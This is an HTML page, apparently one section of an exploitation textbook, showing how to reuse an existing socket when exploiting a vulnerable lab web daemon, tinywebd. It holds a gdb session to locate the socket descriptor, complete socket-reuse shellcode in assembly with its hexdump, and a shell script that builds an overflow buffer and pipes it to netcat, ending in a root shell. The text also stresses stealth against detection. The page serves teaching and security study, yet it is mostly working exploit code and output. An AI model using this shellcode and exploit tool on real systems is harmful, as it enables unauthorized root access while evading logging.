<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x671 Socket Reuse</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part146.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part148.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark134">0x671 Socket Reuse</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">In our case, there’s really no need to open a new connection, since we already have an open socket from the web request. Since we’re mucking around inside the tinyweb daemon, with a little debugging we can reuse the existing socket for the root shell. This prevents additional TCP connections from being logged and allows exploitation in cases where the target host cannot open outbound connections. Take a look at the source code from tinywebd.c shown below.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Excerpt from tinywebd.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1085.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">while(1) {  // Accept loop</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">sin_size = sizeof(struct sockaddr_in);</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 107%;text-align: left;">new_sockfd = accept(sockfd, (struct sockaddr *)&amp;client_addr, &amp;sin_size); if(new_sockfd == -1)</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">fatal(&quot;accepting connection&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 44pt;text-indent: 0pt;text-align: left;">handle_connection(new_sockfd, &amp;client_addr, logfd);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">return 0;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">/* This function handles the connection on the passed socket from the</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">* passed client address and logs to the passed FD. The connection is</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">* processed as a web request, and this function replies over the connected</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">* socket. Finally, the passed socket is closed at the end of the function.</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">*/</p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) { unsigned char *ptr, request[500], resource[500], log_buffer[500];</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int fd, length;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">length = recv_line(sockfd, request);</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1086.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Unfortunately, the <span class="s31">sockfd </span>passed to <span class="s31">handle_connection() </span>will inevitably be overwritten so we can overwrite <span class="s31">logfd</span>. This overwrite happens before we gain control of the program in the shellcode, so there’s no way to recover the previous value of <span class="s31">sockfd</span>. Luckily, <span class="s31">main() </span>keeps another copy of the socket’s file descriptor in <span class="s31">new_sockfd</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1087.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:37pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:74pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">478 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">420 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23:24</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:37pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:74pt"><p class="s42" style="padding-left: 9pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">1284 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/1</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23:42</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ sudo gdb -q—pid=478 --symbols=./a.out</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">warning: not using untrusted file &quot;/home/reader/.gdbinit&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. Attaching to process 478</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">/cow/home/reader/booksrc/tinywebd: No such file or directory. A program is being debugged already. Kill it? (y or n) n Program not killed.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) list handle_connection</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">77   /* This function handles the connection on the passed socket from the</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">78    * passed client address and logs to the passed FD. The connection is</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">79    * processed as a web request, and this function replies over the connected</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">80   * socket. Finally, the passed socket is closed at the end of the function.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">81   */</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">82   void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">83     unsigned char *ptr, request[500], resource[500], log_buffer[500];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">84    int fd, length; 85</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">86     length = recv_line(sockfd, request); (gdb) break 86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x8048fc3: file tinywebd.c, line 86. (gdb) cont</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Continuing.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1088.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">After the breakpoint is set and the program continues, the silent exploit tool is used from another terminal to connect and advance execution.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1089.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">86     length = recv_line(sockfd, request); (gdb) x/x &amp;sockfd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff7e0:  0x0000000d (gdb) x/x &amp;new_sockfd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">No symbol &quot;new_sockfd&quot; in current context. (gdb) bt</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#0 handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86 #1 0x08048fb7 in main () at tinywebd.c:72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) select-frame 1 (gdb) x/x &amp;new_sockfd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff83c:  0x0000000d (gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The program is running. Quit anyway (and detach it)? (y or n) y Detaching from program: , process 478</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1090.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">This debugging output shows that <span class="s31">new_sockfd </span>is stored at <span class="s31">0xbffff83c </span>within main’s stack frame. Using this, we can create shellcode that uses the socket file descriptor stored here instead of creating a new connection.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">While we could just use this address directly, there are many little things that can shift stack memory around. If this happens and the shellcode is using a hard-coded stack address, the exploit will fail. To make the shellcode more reliable, take a cue from how the compiler handles stack variables. If we use an address relative to ESP, then even if the stack shifts around a bit, the address</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">of <span class="s31">new_sockfd </span>will still be correct since the offset from ESP will be the same. As you may remember from debugging with the <span class="s31">mark_break </span>shellcode, ESP was <span class="s31">0xbffff7e0</span>. Using this value for ESP, the offset is shown to be <span class="s31">0x5c </span>bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1091.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) print /x 0xbffff83c - 0xbffff7e0</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$1 = 0x5c (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1092.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">The following shellcode reuses the existing socket for the root shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">socket_reuse_restore.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1093.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x02  ; Fork is syscall #2 pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">int 0x80     ; After the fork, in child process eax == 0. test eax, eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">jz child_process ; In child process spawns a shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 12pt;line-height: 107%;text-align: left;">; In the parent process, restore tinywebd. lea ebp, [esp+0x68] ; Restore EBP.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push 0x08048fb7   ; Return address. ret         ; Return.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">child_process:</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">; Re-use existing socket.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">lea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx. mov ebx, [edx]    ; Put the value of new_sockfd in ebx. push BYTE 0x02</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop ecx     ; ecx starts at 2. xor eax, eax</p><p class="s31" style="padding-left: 91pt;text-indent: 12pt;line-height: 107%;text-align: left;">xor edx, edx dup_loop:</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63 int 0x80     ; dup2(c, 0)</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">dec ecx     ; Count down to 0.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">jns dup_loop   ; If the sign flag is not set, ecx is not negative.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) mov BYTE al, 11  ; execve syscall #11</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push edx     ; push some nulls for string termination. push 0x68732f2f  ; push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">push 0x6e69622f  ; push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx, via esp. push edx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ebx     ; push string addr to stack above null terminator. mov ecx, esp   ; This is the argv array with string ptr.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1094.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">To effectively use this shellcode, we need another exploitation tool that lets us send the exploit buffer but keeps the socket out for further I/O. This second exploit script adds an additional <span class="s31">cat - </span>command to the end of the exploit buffer. The dash argument means standard input. Running cat on standard input is somewhat useless in itself, but when the command is piped into netcat, this effectively ties standard input and output to netcat’s network socket. The script below connects to the target, sends the exploit buffer, and then keeps the socket open and gets further input from the terminal. This is done with just a few modifications (shown in bold) to the silent exploit tool.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">xtool_tinywebd_reuse.sh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1095.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#!/bin/sh</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;"># Silent stealth exploitation tool for tinywebd #  also spoofs IP address stored in memory</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#  reuses existing socket—use socket_reuse shellcode</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SPOOFIP=&quot;12.34.56.78&quot; SPOOFPORT=&quot;9090&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">if [ -z &quot;$2&quot; ]; then # if argument 2 is blank echo &quot;Usage: $0 &lt;shellcode file&gt; &lt;target IP&gt;&quot; exit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fi</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">FAKEREQUEST=&quot;GET / HTTP/1.1\x00&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">FR_SIZE=$(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot; | wc -c | cut -f1 -d &#39; &#39;) OFFSET=540</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">RETADDR=&quot;\x24\xf6\xff\xbf&quot; # at +100 bytes from buffer @ 0xbffff5c0 FAKEADDR=&quot;\xcf\xf5\xff\xbf&quot; # +15 bytes from buffer @ 0xbffff5c0 echo &quot;target IP: $2&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SIZE=`wc -c $1 | cut -f1 -d &#39; &#39;` echo &quot;shellcode: $1 ($SIZE bytes)&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">echo &quot;fake request: \&quot;$FAKEREQUEST\&quot; ($FR_SIZE bytes)&quot; ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">echo &quot;[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot;;</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">./addr_struct &quot;$SPOOFIP&quot; &quot;$SPOOFPORT&quot;;</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">perl -e &quot;print \&quot;\x90\&quot;x$ALIGNED_SLED_SIZE&quot;; cat $1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">perl -e &quot;print \&quot;$RETADDR\&quot;x32 . \&quot;$FAKEADDR\&quot;x2 . \&quot;\x01\x00\x00\x00\r\n\&quot;&quot;;</p><p class="s46" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">cat -;<span class="s31">) | nc -v $2 80</span></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1096.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When this tool is used with the socket_reuse_restore shellcode, the root shell will be served up using the same socket used for the web request. The following output demonstrates this.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1097.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nasm socket_reuse_restore.s reader@hacking:~/booksrc $ hexdump -C socket_reuse_restore</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X..t.l$hh.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 04 08 c3 8d 54 24 5c 8b 1a 6a 02 59 31 c0 31 d2 |..T$\.j.Y1.1.|</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 b0 3f cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 |.?.Iy..Rh//shh|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030 2f 62 69 6e 89 e3 52 89 e2 53 89 e1 cd 80    |/bin.R.S..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0000003e</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh socket_reuse_restore 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">shellcode: socket_reuse_restore (62 bytes) fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[Fake Request 15] [spoof IP 16] [NOP 323] [shellcode 62] [ret addr 128] [*fake_addr 8]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">localhost [127.0.0.1] 80 (www) open whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1098.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">By reusing the existing socket, this exploit is even quieter since it doesn’t create any additional connections. Fewer connections mean fewer abnormal- ities for any countermeasures to detect.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part148.htm">0x680 Payload Smuggling</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part146.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part148.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
